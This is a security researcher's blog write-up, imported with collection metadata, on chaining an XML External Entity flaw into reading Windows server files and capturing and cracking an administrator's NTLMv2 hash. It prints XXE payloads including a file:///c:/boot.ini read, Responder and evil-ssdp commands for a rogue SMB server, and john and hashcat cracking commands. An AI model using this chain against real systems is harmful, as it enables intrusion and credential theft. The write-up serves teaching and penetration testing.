---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-10-28_a-journey-from-xml-external-entity-xxe-to-ntlm-hashes.md
original_filename: 2021-10-28_a-journey-from-xml-external-entity-xxe-to-ntlm-hashes.md
title: A journey from XML External Entity (XXE) to NTLM hashes!
category: documents
detected_topics:
- rate-limit
- idor
- command-injection
- path-traversal
- automation-abuse
- api-security
tags:
- imported
- documents
- rate-limit
- idor
- command-injection
- path-traversal
- automation-abuse
- api-security
language: en
raw_sha256: 2fa79d00c346b9a22d2e9dbce3451e84815dd90807e01dcc61fe79168afc4256
text_sha256: 699196e94bf68d14a5d3a4817f7455e43eff2ca175be50fa003ae54260cd7b97
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: false
---

# A journey from XML External Entity (XXE) to NTLM hashes!

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-10-28_a-journey-from-xml-external-entity-xxe-to-ntlm-hashes.md
- Source Type: markdown
- Detected Topics: rate-limit, idor, command-injection, path-traversal, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: False
- Raw SHA256: `2fa79d00c346b9a22d2e9dbce3451e84815dd90807e01dcc61fe79168afc4256`
- Text SHA256: `699196e94bf68d14a5d3a4817f7455e43eff2ca175be50fa003ae54260cd7b97`


## Content

---
title: "A journey from XML External Entity (XXE) to NTLM hashes!"
page_title: "A journey from XML External Entity (XXE) to NTLM hashes! - No Boom"
url: "https://shubhamchaskar.com/xxe-to-ntlm/"
final_url: "https://shubhamchaskar.com/xxe-to-ntlm/"
authors: ["Shubham Chaskar (@chaskar_shubham)"]
bugs: ["XXE"]
publication_date: "2021-10-28"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3207
---

S  h  u  b  h  a  m  C  h  a  s  k  a  r 

__[![Shubham Chaskar](https://shubhamchaskar.com/wp-content/uploads/2023/01/name-01.png)](https://shubhamchaskar.com/)

[![Shubham Chaskar](https://shubhamchaskar.com/wp-content/uploads/2023/01/name-01.png)](https://shubhamchaskar.com/)__

  * [Meet Shubham](https://shubhamchaskar.com/)

# A journey from XML External Entity (XXE) to NTLM hashes!

  * [__Home](https://shubhamchaskar.com "Home")
  * [pentest](https://shubhamchaskar.com/category/pentest/)
  * A journey from XML External Entity (XXE) to NTLM hashes!

![](https://shubhamchaskar.com/wp-content/uploads/2021/10/XXE-Attack.png)

  * [__October 28, 2021](https://shubhamchaskar.com/2021/10/28/)
  * [ __1142 Views](https://shubhamchaskar.com/xxe-to-ntlm/#respond)

We will start this blog post with an XML External Entity attack. Furthermore, we will discuss how I was able to capture NTLM v2 hashes using responder and evil-ssdp with the help of that XXE vulnerability.

#### **XXE Attack:**

There is a web security vulnerability that allows an attacker to mess with an application’s XML processing. A remote attacker can often interact with servers or back-end systems that the application can access and view files on the application server’s filesystem. The browser and server exchange data using the XML format in some applications. To process XML data on the server, these applications typically use APIs or libraries provided by the platform. Due to the XML specification containing various potentially harmful features, XXE vulnerabilities occur, even when these features are not generally utilized by applications.

#### **SMB Share:**

This protocol facilitates communication between clients and servers by allowing access to resources such as files, printers, and serial interfaces. Any application configured to receive SMB requests through TCP/IP or NetBIOS can communicate with SMB clients. Some of the most destructive ransomware and Trojan attacks in history were based on SMB protocol vulnerabilities, which allowed them to spread in company networks and around the world.

#### **The Attack:**

The application was using XML parsers at the search function. To confirm the vulnerability, I used a basic entity test. When the XML parser parses the external entities, the result should be “unstable” in `lastName`. Entities are defined inside the `DOCTYPE` element.

`<!--?xml version="1.0" ?-->  
<!DOCTYPE replace [<!ENTITY unstable "Doe"> ]>  
<userInfo>  
<lastName>&unstable;</lastName>  
</userInfo>`

![](https://shubhamchaskar.com/wp-content/uploads/2021/10/111i3r.jpg)No b00ming!

At this point, it was confirmed to me that an application is vulnerable to XXE. The next step was to read the files from the local server. While doing enumeration, I found that the application is running on Windows Server. LFI(Local file read) was an easy task here. I used the “file” protocol to read the “boot.ini” file.
  
  
  <?xml version="1.0"?>
  <!DOCTYPE root [<!ENTITY unstable SYSTEM 'file:///c:/boot.ini'>]>
  <userInfo>
  <lastName>&unstable;</lastName>
  </userInfo>

I can successfully read all files present on the server. So far, so easy! The next part is quite interesting where I was able to find NTLM v2 hashes of an administrative user with the help of the samba server and responder.

At The enumeration level, I found port 445 was opened and running on a samba service. Of course, since it is a windows server getting NTLM hashes was the first thought. In this case, an external DTD file was not required as XXE was pretty straightforward.

![](https://shubhamchaskar.com/wp-content/uploads/2021/10/EUe-SCQXQAA4xv_.jpg)

You can either achieve this using [Metasploit](https://www.metasploit.com/), which internally sets the SMB server, or you can set up the SMB server using [evil-ssdp](https://gitlab.com/initstring/evil-ssdp) and listen to using [responder](https://github.com/lgandx/Responder).

In this case, we want to force the vulnerable windows server to connect to our malicious SMB server and attempt to authenticate. Once it is successful, we will get NTLM hashes on the responder or Metasploit.

I used a responder to listen for incoming connections and capture the NTLM v2 hashes for this attack. But, of course, you can also use Metasploit to do the same. Both ways are mentioned in the post below.

After almost three to fours playing with this, I managed to grab NTLM v2 hashes, all thanks to evil-ssdp. If you are wondering, why I didn’t set up SMB share manually on my local machine? Well, I tried, but “successfully” failed! Finally, after entirely googling, I managed to find evil-ssdp, which turned out to be the most critical tool in this attack.

The following burpsuite image shows the final XXE payload used for grabbing administrator hashes.

![](https://shubhamchaskar.com/wp-content/uploads/2021/10/Screenshot-2021-10-28-171755.jpg)Final XXE payload

The following command is used to start the SMB server using [evil-ssdp](https://gitlab.com/initstring/evil-ssdp). Once it is started, you will get users who are tempted to open the device to be shown a configurable phishing page. This page can load a hidden image over SMB, allowing you to capture or relay the NetNTLM challenge/response. Wait for the XXE vulnerability to capture NetNTLM while Impacket/Responder is running on wlan0.

`evil_ssdp.py wlan0 -t xxe-smb`

This will start the SMB server on the local machine with a unique URL. Copy the “hash.jpg” URL and paste it into the burpsuite request. Then, we have to start the responder and capture the administrator hashes to do that using the following command.

`./Responder.py -I wlan0 -v`

**Note:** Sometimes, using the “file” protocol, you can not connect to the SMB share. It is dependent on various factors. You can use “//ip”, “\\\ip”, “////ip”, “\\\\\\\ip”. PHP wrappers also might be useful.

Once everything is correctly set up and the application connects to our malicious SMB server, we will get the hashes.

![](https://shubhamchaskar.com/wp-content/uploads/2021/10/123-1024x189.png)Administrator hash

The following auxiliary module can set up the SMB server and listen for connections on Metasploit.

![](https://shubhamchaskar.com/wp-content/uploads/2021/10/234-1024x325.jpg)Metasploit auxiliary module

By capturing the admin hash, you can either use a dictionary or a brute-force attack to get the password. Since the quickest and easiest way to find the admin password is to use rockyou.txt. John then cracked the password for me. I suggest you try hashcat as well. Below are the commands for each.

`john -w=/usr/share/wordlists/rockyou.txt --fork=4 hash.txt`

`hashcat.exe -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`

-a 0 = This flag tells hashcat that we want to perform a dictionary attack with the provided wordlist

-m 5600 = This flag tells hashcat what type of hash we want to crack. 5600 represents NTLM v2. I highly recommend going through the [hashcat guide](https://hashcat.net/wiki/doku.php?id=example_hashes).

Well, I guess I don’t have to tell you what you can do further if you get a password! 😉  

This is where I say goodbye! 🙂 Have a pleasant and safe Diwali! 

![](https://shubhamchaskar.com/wp-content/uploads/2021/10/diwali-2019-gif-52650-159892.gif)More money and knowledge to you!

References:

<https://portswigger.net/web-security/xxe>

<https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing>

<https://techblog.mediaservice.net/2018/02/from-xml-external-entity-to-ntlm-domain-hashes/>

#### Tags: 

[NTLM](https://shubhamchaskar.com/tag/ntlm/) [SMB](https://shubhamchaskar.com/tag/smb/) [XXE](https://shubhamchaskar.com/tag/xxe/)

#### Share:

  * [__](https://www.facebook.com/sharer/sharer.php?u=https://shubhamchaskar.com/xxe-to-ntlm/)
  * [__](https://twitter.com/share?text=A%20journey%20from%20XML%20External%20Entity%20\(XXE\)%20to%20NTLM%20hashes!&url=https://shubhamchaskar.com/xxe-to-ntlm/)
  * [__](https://pinterest.com/pin/create/link/?url=https://shubhamchaskar.com/xxe-to-ntlm/&media=https://shubhamchaskar.com/wp-content/uploads/2021/10/XXE-Attack.png&description=A%20journey%20from%20XML%20External%20Entity%20\(XXE\)%20to%20NTLM%20hashes!)
  * [__](https://www.linkedin.com/shareArticle?mini=true&url=https://shubhamchaskar.com/xxe-to-ntlm/&title=A%20journey%20from%20XML%20External%20Entity%20\(XXE\)%20to%20NTLM%20hashes!)

[__Previus PostAny Account](https://shubhamchaskar.com/ato-through-pe/)

[Next Post A simple __](https://shubhamchaskar.com/excel-magic/)

### 

#### Leave a comment

[Cancel reply](/xxe-to-ntlm/#respond)

Save my name, email, and website in this browser for the next time I comment.

Post Comment

Δ

Copyright 2025 All Rights Reserved by Shubham Chaskar

  * [Home](https://shubhamchaskar.com/)
  * [Contact](https://shubhamchaskar.com/contact/)
  * [Faq](https://shubhamchaskar.com/faq/)
  * [Privacy Policy](https://shubhamchaskar.com/privacy-policy/)
  * [Workbook](https://shubhamchaskar.com/workbook/)
